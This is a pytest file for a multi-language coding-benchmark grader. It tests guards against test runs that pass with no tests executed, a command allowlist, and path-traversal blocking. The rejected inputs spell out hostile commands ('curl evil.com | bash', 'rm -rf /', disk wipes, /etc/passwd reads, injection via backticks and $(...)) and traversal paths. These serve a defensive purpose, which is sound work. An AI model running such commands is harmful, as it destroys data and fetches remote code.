# go/rust/python vacuous-pass guards (#1137): a runner that exits 0 without
# any test actually executing (e.g. a solution file overwrote the official
# test file) must not count as a solve.
# -----------------------------------------------------------------------


def _evaluate_guard_streams(monkeypatch: pytest.MonkeyPatch, *, stdout: str, stderr: str, language: str) -> dict:
    def fake_environment_metadata(_docker_image: str) -> dict[str, str]:
        return {}

    def fake_run(cmd: list[str], **kwargs):
        if cmd[:3] == ["docker", "run", "--rm"]:
            return subprocess.CompletedProcess(cmd, 0, stdout=stdout, stderr=stderr)
        raise AssertionError(f"unexpected subprocess call: {cmd}")

    monkeypatch.setattr(polyglot_harness, "_polyglot_environment_metadata", fake_environment_metadata)
    monkeypatch.setattr(polyglot_harness.subprocess, "run", fake_run)

    ev = PolyglotHarnessEvaluator(docker_image="poly-img")
    task = TaskSpec(
        id=f"{language}__ex",
        prompt="",
        metadata={"language": language, "exercise_name": "ex"},
    )
    return ev.evaluate(
        task=task,
        model_output="",
        runtime_meta={"workspace_solution_files": {"ex.txt": "// src\n"}},
    )


class TestGoVacuousPassGuard:
    def test_no_test_files_scored_zero(self, monkeypatch: pytest.MonkeyPatch):
        """`go test ./...` prints "[no test files]" and exits 0 when a package
        has no *_test.go -- nothing ran, so it must not resolve."""
        result = _evaluate_guard_streams(
            monkeypatch,
            stdout="?   \texercise\t[no test files]\n",
            stderr="",
            language="go",
        )
        assert result["status"] == "ok"
        assert result["resolved"] is False
        assert result["native_score"] == 0.0
        assert result["go_vacuous_pass_guard"] is True

    def test_real_pass_not_flagged(self, monkeypatch: pytest.MonkeyPatch):
        result = _evaluate_guard_streams(
            monkeypatch,
            stdout="ok  \texercise\t0.012s\n",
            stderr="",
            language="go",
        )
        assert result["resolved"] is True
        assert result["native_score"] == 1.0
        assert "go_vacuous_pass_guard" not in result

    def test_mixed_packages_with_a_real_pass_not_flagged(self, monkeypatch: pytest.MonkeyPatch):
        """A no-test helper package alongside a package that actually passed
        tests is a genuine solve (there is an "ok" line)."""
        result = _evaluate_guard_streams(
            monkeypatch,
            stdout="ok  \texercise\t0.010s\n?   \texercise/helper\t[no test files]\n",
            stderr="",
            language="go",
        )
        assert result["resolved"] is True
        assert "go_vacuous_pass_guard" not in result


class TestRustVacuousPassGuard:
    def test_zero_tests_scored_zero(self, monkeypatch: pytest.MonkeyPatch):
        """`cargo test` exits 0 with "test result: ok. 0 passed" when no test
        ran -- must not resolve."""
        result = _evaluate_guard_streams(
            monkeypatch,
            stdout=(
                "running 0 tests\n"
                "test result: ok. 0 passed; 0 failed; 0 ignored; 0 measured; 0 filtered out; finished in 0.00s\n"
            ),
            stderr="",
            language="rust",
        )
        assert result["status"] == "ok"
        assert result["resolved"] is False
        assert result["native_score"] == 0.0
        assert result["rust_vacuous_pass_guard"] is True

    def test_real_pass_not_flagged(self, monkeypatch: pytest.MonkeyPatch):
        result = _evaluate_guard_streams(
            monkeypatch,
            stdout=(
                "running 3 tests\ntest test_a ... ok\ntest test_b ... ok\ntest test_c ... ok\n"
                "test result: ok. 3 passed; 0 failed; 0 ignored; 0 measured; 0 filtered out; finished in 0.01s\n"
            ),
            stderr="",
            language="rust",
        )
        assert result["resolved"] is True
        assert result["native_score"] == 1.0
        assert "rust_vacuous_pass_guard" not in result


class TestPythonVacuousPassGuard:
    def test_forced_exit0_no_tests_scored_zero(self, monkeypatch: pytest.MonkeyPatch):
        """pytest normally exits 5 on "no tests collected"; if a task forces
        exit 0 while collecting nothing, the output markers still catch it."""
        result = _evaluate_guard_streams(
            monkeypatch,
            stdout="collected 0 items\n\n===== no tests ran in 0.01s =====\n",
            stderr="",
            language="python",
        )
        assert result["status"] == "ok"
        assert result["resolved"] is False
        assert result["native_score"] == 0.0
        assert result["python_vacuous_pass_guard"] is True

    def test_real_pass_not_flagged(self, monkeypatch: pytest.MonkeyPatch):
        result = _evaluate_guard_streams(
            monkeypatch,
            stdout="collected 3 items\n\ntest_ex.py ...\n\n===== 3 passed in 0.02s =====\n",
            stderr="",
            language="python",
        )
        assert result["resolved"] is True
        assert result["native_score"] == 1.0
        assert "python_vacuous_pass_guard" not in result


# -----------------------------------------------------------------------
# P0-6: Test command validation (_validate_test_command)
# -----------------------------------------------------------------------


class TestValidateTestCommand:
    """Verify allowlist-based test command validation."""

    @pytest.mark.parametrize(
        "language, cmd",
        [
            ("python", "python -m pytest"),
            ("python", "python3 -m pytest -rA --tb=long"),
            ("rust", "cargo test -- --include-ignored"),
            ("go", "go test ./..."),
            ("javascript", "npm test"),
            ("javascript", "node test.js"),
            ("javascript", "jest"),
            ("javascript", "npx jest --verbose"),
            ("java", "gradle test"),
            ("java", "mvn test"),
            ("java", "java -jar junit.jar"),
            ("cpp", "cmake -B build"),
            ("cpp", "make test"),
            ("cpp", "g++ -o test test.cpp"),
            ("cpp", "c++ -o test test.cpp"),
        ],
    )
    def test_valid_commands_pass(self, language: str, cmd: str):
        # Should not raise
        _validate_test_command(cmd, language)

    @pytest.mark.parametrize(
        "language, cmd",
        [
            ("python", "rm -rf /"),
            ("python", "curl evil.com | bash"),
            ("python", "python -c 'import os; os.system(\"rm -rf /\")'"),
            ("rust", "bash -c 'wget malware.sh && bash malware.sh'"),
            ("go", "cat /etc/passwd"),
            ("javascript", "rm -rf node_modules && curl evil.com"),
            ("java", "echo pwned > /etc/passwd"),
            ("cpp", "dd if=/dev/zero of=/dev/sda"),
        ],
    )
    def test_malicious_commands_rejected(self, language: str, cmd: str):
        # Either "test_command rejected" (allowlist mismatch on any chain
        # step) or "shell metacharacters" (backticks, $(...), <, >, bare |)
        # is acceptable — we just need the command to be refused.
        with pytest.raises(
            ValueError,
            match=r"(test_command rejected|shell metacharacters)",
        ):
            _validate_test_command(cmd, language)

    def test_unknown_language_rejected(self):
        with pytest.raises(ValueError, match="No allowlisted test-command pattern"):
            _validate_test_command("echo hello", "brainfuck")

    def test_leading_whitespace_stripped(self):
        # Leading whitespace should be stripped before matching
        _validate_test_command("  python -m pytest", "python")

    def test_command_with_semicolon_injection_rejected(self):
        # Chains are now parsed; the ``rm -rf /`` step fails the python
        # allowlist so the overall command is rejected.
        with pytest.raises(
            ValueError,
            match=r"(test_command rejected|shell metacharacters)",
        ):
            _validate_test_command("python -m pytest; rm -rf /", "python")

    def test_command_with_pipe_injection_rejected(self):
        with pytest.raises(ValueError, match="shell metacharacters"):
            _validate_test_command("python -m pytest | tee /tmp/out", "python")

    def test_command_with_backtick_injection_rejected(self):
        with pytest.raises(ValueError, match="shell metacharacters"):
            _validate_test_command("python -m pytest `whoami`", "python")

    def test_command_with_subshell_injection_rejected(self):
        with pytest.raises(ValueError, match="shell metacharacters"):
            _validate_test_command("python -m pytest $(cat /etc/passwd)", "python")

    # -- Regression: multi-step C++ test chains (``cmake && ... && ctest``) --

    def test_cpp_multi_step_cmake_chain_accepted(self):
        """Regression: C++ Exercism tasks like ``cpp__diamond`` / ``cpp__queen-attack``
        ship a multi-step test_command that was deterministically rejected by the
        old single-step shell-metachar guard.  Each chain step must now pass the
        per-language allowlist; the full command should be accepted without
        raising.
        """
        cmd = "cmake -B build && cmake --build build && cd build && ctest --output-on-failure"
        # Must not raise
        _validate_test_command(cmd, "cpp")

    def test_cpp_chain_with_malicious_step_rejected(self):
        """A chain whose first step is legitimate but whose later step is not
        must still be rejected.  This guards against ``cmake && rm -rf /``.
        """
        with pytest.raises(
            ValueError,
            match=r"(test_command rejected|shell metacharacters)",
        ):
            _validate_test_command("cmake -B build && rm -rf /", "cpp")

    def test_trailing_background_ampersand_rejected(self):
        """``cmd &`` (background) is rejected even though ``&&`` chains are allowed."""
        with pytest.raises(ValueError, match="shell metacharacters"):
            _validate_test_command("python -m pytest &", "python")


# -----------------------------------------------------------------------
# P0-7: Path traversal prevention (_safe_write)
# -----------------------------------------------------------------------


class TestSafeWrite:
    """Verify _safe_write blocks path traversal."""

    def test_normal_write(self):
        with tempfile.TemporaryDirectory() as tmpdir:
            base = Path(tmpdir)
            _safe_write(base, "solution.py", "x = 1")
            assert (base / "solution.py").read_text() == "x = 1"

    def test_nested_write(self):
        with tempfile.TemporaryDirectory() as tmpdir:
            base = Path(tmpdir)
            _safe_write(base, "src/lib.rs", "fn main() {}")
            assert (base / "src" / "lib.rs").read_text() == "fn main() {}"

    def test_dotdot_traversal_blocked(self):
        with tempfile.TemporaryDirectory() as tmpdir:
            base = Path(tmpdir) / "exercise"
            base.mkdir()
            with pytest.raises(ValueError, match="path traversal"):
                _safe_write(base, "../../../etc/passwd", "pwned")

    def test_dotdot_in_middle_blocked(self):
        with tempfile.TemporaryDirectory() as tmpdir:
            base = Path(tmpdir)
            with pytest.raises(ValueError, match="path traversal"):
                _safe_write(base, "src/../../etc/shadow", "pwned")

    def test_absolute_path_blocked(self):
        with tempfile.TemporaryDirectory() as tmpdir:
            base = Path(tmpdir)
            with pytest.raises(ValueError, match="path traversal"):
                _safe_write(base, "/etc/passwd", "pwned")

    def test_symlink_traversal_blocked(self):
        """Symlink-based escape is blocked by resolve()."""
        with tempfile.TemporaryDirectory() as tmpdir:
            base = Path(tmpdir) / "exercise"
            base.mkdir()
            escape_target = Path(tmpdir) / "outside"
            escape_target.mkdir()
            # Create symlink inside base that points outside
            symlink = base / "escape"
            symlink.symlink_to(escape_target)
            with pytest.raises(ValueError, match="path traversal"):
                _safe_write(base, "escape/pwned.txt", "gotcha")

    def test_sibling_prefix_escape_blocked(self):
        with tempfile.TemporaryDirectory() as tmpdir:
            base = Path(tmpdir) / "polyglot-eval-demo"
            base.mkdir()
            with pytest.raises(ValueError, match="path traversal"):
                _safe_write(base, f"../{base.name}-escape/pwned.txt", "gotcha")


# -----------------------------------------------------------------------
# _validate_safe_path
# -----------------------------------------------------------------------


class TestValidateSafePath:
    """Verify _validate_safe_path rejects path traversal."""

    def test_path_traversal_rejected(self):
        """Task metadata with '../' in filenames must raise ValueError."""
        with tempfile.TemporaryDirectory() as tmpdir:
            base = Path(tmpdir)
            # Normal paths should work
            p = _validate_safe_path(base, "src/main.py")
            assert str(p).startswith(str(base.resolve()))

            # Traversal should raise
            with pytest.raises(ValueError, match="path traversal"):
                _validate_safe_path(base, "../../etc/evil.txt")
            with pytest.raises(ValueError, match="path traversal"):
                _validate_safe_path(base, "../../../tmp/pwned")

    def test_sibling_prefix_escape_rejected(self):
        with tempfile.TemporaryDirectory() as tmpdir:
            base = Path(tmpdir) / "polyglot-eval-demo"
            base.mkdir()
            with pytest.raises(ValueError, match="path traversal"):
                _validate_safe_path(base, f"../{base.name}-escape/file.txt")

    def test_sibling_prefix_not_allowed(self):
        """Reject names that begin with the base directory name but escape with traversal."""
        with tempfile.TemporaryDirectory() as tmpdir:
            base = Path(tmpdir) / "base"
            base.mkdir()
            sibling = Path(tmpdir) / "base_sneaky"
            sibling.mkdir()
            # This currently looks like a basename prefix match, but resolves
            # outside the base directory and must be rejected.
            with pytest.raises(ValueError, match="path traversal"):
                _validate_safe_path(base, "../base_sneaky/file.py")


def test_cpp_exercise_name_sibling_prefix_escape_rejected(monkeypatch, tmp_path: Path):
    tmpdir_root = tmp_path / "polyglot-eval-demo"
    tmpdir_root.mkdir()
    monkeypatch.setattr(polyglot_harness.tempfile, "mkdtemp", lambda prefix: str(tmpdir_root))
    task = TaskSpec(
        id="cpp__demo",
        prompt="solve",
        metadata={
            "language": "cpp",
            "exercise_name": "../polyglot-eval-demo-escape",
            "test_files": {},
            "build_files": {},
            "starter_code": {},
        },
    )
    ev = PolyglotHarnessEvaluator(docker_image="poly-img")

    with pytest.raises(ValueError, match="path traversal"):
        ev._run_in_docker(task=task, language="cpp", solution_files={})


def test_existing_absolute_starter_code_path_rejected_before_docker(monkeypatch, tmp_path: Path):
    tmpdir_root = tmp_path / "polyglot-eval-demo"
    tmpdir_root.mkdir()
    outside = tmp_path / "outside.py"
    outside.write_text("print('owned')", encoding="utf-8")
    monkeypatch.setattr(polyglot_harness.tempfile, "mkdtemp", lambda prefix: str(tmpdir_root))
    task = TaskSpec(
        id="python__demo",
        prompt="solve",
        metadata={
            "language": "python",
            "starter_code": {str(outside): "print('owned')"},
            "test_files": {},
            "build_files": {},
        },
    )
    ev = PolyglotHarnessEvaluator(docker_image="poly-img")

    with pytest.raises(ValueError, match="path traversal"):
        ev._run_in_docker(task=task, language="python", solution_files={})


def test_restore_host_ownership_runs_chown_container(monkeypatch, tmp_path: Path):
    calls = []

    def fake_run(cmd: list[str], **kwargs):
        calls.append((cmd, kwargs))
        return subprocess.CompletedProcess(cmd, 0, stdout="", stderr="")

    monkeypatch.setattr(polyglot_harness.subprocess, "run", fake_run)

    _restore_host_ownership(tmp_path, "poly-img")

    if os.name == "posix":
        assert calls
        cmd, kwargs = calls[0]
        assert cmd[:4] == ["docker", "run", "--rm", "-v"]
        assert cmd[-3:] == ["bash", "-lc", f"chown -R {os.getuid()}:{os.getgid()} /exercise"]
        assert kwargs["timeout"] == 30
    else:
        assert calls == []


# -----------------------------------------------------------------------
# PolyglotHarnessEvaluator (skip_docker=False) — real `docker run` scoring
# -----------------------------------------------------------------------
#
# Every test above uses skip_docker=True, which returns a synthetic
# status="skip_docker" result before the real scoring path (`_run_in_docker`
# -> `subprocess.run(["docker", "run", ...])` -> `passed = proc.returncode
# == 0`) ever executes. This section replays a minimal, self-contained
# Python exercise through that real path for one known-passing and one
# known-failing solution, mirroring
# tests/eval/test_swebench_pro_teleport_regression.py's self-skip style:
# the test is marked slow/docker/integration and skips cleanly (does not
# fail CI) when Docker or the polyglot eval image isn't available.

_DOCKER_IMAGE = polyglot_harness._DEFAULT_POLYGLOT_DOCKER_IMAGE

_COVERAGE_FIXTURE_TEST_FILE = "from solution import add\n\n\ndef test_add():\n    assert add(2, 3) == 5\n"

_PASSING_MODEL_OUTPUT = "```python\n# file: solution.py\ndef add(a, b):\n    return a + b\n```\n"

_FAILING_MODEL_OUTPUT = "```python\n# file: solution.py\ndef add(a, b):\n    return a - b\n```\n"

_CPP_LIBRARY_ONLY_CMAKELISTS = """\
cmake_minimum_required(VERSION 3.16)
project(diamond LANGUAGES CXX)
add_library(diamond diamond.cpp)
"""

_CPP_IGNORED_TEST_FILE = """\
// Present but intentionally not registered by the library-only CMakeLists.
// If ctest's zero-test exit 0 is misread as success, this task will pass
// vacuously without compiling or running any assertion.
"""

_CPP_LIBRARY_ONLY_MODEL_OUTPUT = """```cpp
// file: diamond.cpp
int diamond() {
    return 42;
}
```
"""


def _docker_available() -> bool:
    """Return True iff ``docker info`` succeeds in a short window."""
    if shutil.which("docker") is None:
        return False
    try:
        proc = subprocess.run(["docker", "info"], capture_output=True, text=True, timeout=10)
        return proc.returncode == 0
    except (subprocess.TimeoutExpired, OSError):
        return False


def _polyglot_image_available(docker_image: str) -> bool:
    """Return True iff *docker_image* is present in the local image cache."""
    try:
        proc = subprocess.run(
            ["docker", "image", "inspect", docker_image],
            capture_output=True,
            text=True,
            timeout=10,
        )
        return proc.returncode == 0
    except (subprocess.TimeoutExpired, OSError):
        return False


@pytest.mark.slow
@pytest.mark.docker
@pytest.mark.integration
@pytest.mark.parametrize(
    "model_output, expected_resolved",
    [
        (_PASSING_MODEL_OUTPUT, True),
        (_FAILING_MODEL_OUTPUT, False),
    ],
    ids=["passing-solution-resolved", "failing-solution-unresolved"],
)
def test_real_docker_scoring_matches_expected_outcome(model_output: str, expected_resolved: bool) -> None:
    """Replay a minimal Python exercise through the real ``docker run`` scoring path.

    Exercises the code at src/kcsi/benchmarks/polyglot_harness.py's `_run_in_docker`
    (subprocess.run -> proc.returncode == 0), which every skip_docker=True
    test in this file bypasses entirely.
    """
    if not _docker_available():
        pytest.skip("Docker daemon not reachable; skipping real polyglot Docker scoring")
    if not _polyglot_image_available(_DOCKER_IMAGE):
        pytest.skip(
            f"{_DOCKER_IMAGE} image not built; run: "
            'uv run python -c "from kcsi.benchmarks.polyglot_docker import build_image; build_image()"'
        )

    task = TaskSpec(
        id="python__coverage_fixture_add",
        prompt="solve",
        metadata={
            "language": "python",
            "exercise_name": "coverage_fixture_add",
            "test_files": {"solution_test.py": _COVERAGE_FIXTURE_TEST_FILE},
        },
    )
    evaluator = PolyglotHarnessEvaluator(skip_docker=False, timeout_sec=120)

    result = evaluator.evaluate(task=task, model_output=model_output)

    assert result["status"] == "ok", f"evaluator returned unexpected status: {result}"
    assert result["resolved"] is expected_resolved, (
        f"expected resolved={expected_resolved} but got {result['resolved']}. Full result: {result}"
    )
    assert result["native_score"] == (1.0 if expected_resolved else 0.0)


@pytest.mark.slow
@pytest.mark.docker
@pytest.mark.integration
def test_real_docker_cpp_library_only_cmake_is_not_resolved() -> None:
    """C++ ctest exits 0 when no tests are registered; do not count that as solved."""
    if not _docker_available():
        pytest.skip("Docker daemon not reachable; skipping real polyglot Docker scoring")
    if not _polyglot_image_available(_DOCKER_IMAGE):
        pytest.skip(
            f"{_DOCKER_IMAGE} image not built; run: "
            'uv run python -c "from kcsi.benchmarks.polyglot_docker import build_image; build_image()"'
        )

    task = TaskSpec(
        id="cpp__diamond_library_only",
        prompt="solve",
        metadata={
            "language": "cpp",
            "exercise_name": "diamond",
            "build_files": {"CMakeLists.txt": _CPP_LIBRARY_ONLY_CMAKELISTS},
            "test_files": {"diamond_test.cpp": _CPP_IGNORED_TEST_FILE},
        },
    )
    evaluator = PolyglotHarnessEvaluator(skip_docker=False, timeout_sec=120)

    result = evaluator.evaluate(task=task, model_output=_CPP_LIBRARY_ONLY_MODEL_OUTPUT)

    assert result["status"] == "ok", f"evaluator returned unexpected status: {result}"
    assert result["resolved"] is False
    assert result["native_score"] == 0.0
    assert result["cpp_vacuous_pass_guard"] is True


# -----------------------------------------------------------------------
# Runtime Rust toolchain smoke (#1079): the static test above asserts the
# Dockerfile string pins ``--default-toolchain 1.85.1``, but that does not
# prove the built image actually runs rustc/cargo 1.85.1. This opt-in,
# docker-marked test builds nothing (only runs the already-built image) and
# skips cleanly when Docker or the polyglot eval image is absent, mirroring
# the real-scoring test above. Not a hard CI dependency.
# -----------------------------------------------------------------------

_PINNED_RUST_TOOLCHAIN = "1.85.1"


@pytest.mark.slow
@pytest.mark.docker
@pytest.mark.integration
def test_real_docker_rust_toolchain_is_pinned() -> None:
    """The built polyglot eval image runs the pinned rustc/cargo (#1079).

    Guards against the grader silently tracking rustup's moving "latest
    stable" instead of the bench image's ``RUST_TOOLCHAIN=1.85.1``.
    """
    if not _docker_available():
        pytest.skip("Docker daemon not reachable; skipping Rust toolchain smoke")
    if not _polyglot_image_available(_DOCKER_IMAGE):
        pytest.skip(
            f"{_DOCKER_IMAGE} image not built; run: "
            'uv run python -c "from kcsi.benchmarks.polyglot_docker import build_image; build_image()"'
        )

    # Use ``sh -c`` (NOT ``sh -lc``): a login shell sources /etc/profile which
    # resets PATH on Debian/Ubuntu and drops the image's ENV PATH entry for
    # /root/.cargo/bin, making rustc/cargo unresolvable. The image ENV already
    # puts cargo on PATH, so a non-login shell resolves both binaries.
    proc = subprocess.run(
        ["docker", "run", "--rm", _DOCKER_IMAGE, "sh", "-c", "rustc --version && cargo --version"],
        capture_output=True,
        text=True,
        timeout=60,
    )

    combined = (proc.stdout or "") + (proc.stderr or "")
    assert proc.returncode == 0, f"rustc/cargo version probe failed: {combined}"
    assert "rustc" in combined and "cargo" in combined, f"unexpected version output: {combined}"
    assert _PINNED_RUST_TOOLCHAIN in proc.stdout, (
        f"expected pinned Rust toolchain {_PINNED_RUST_TOOLCHAIN}; got: {proc.stdout!r}"
    )
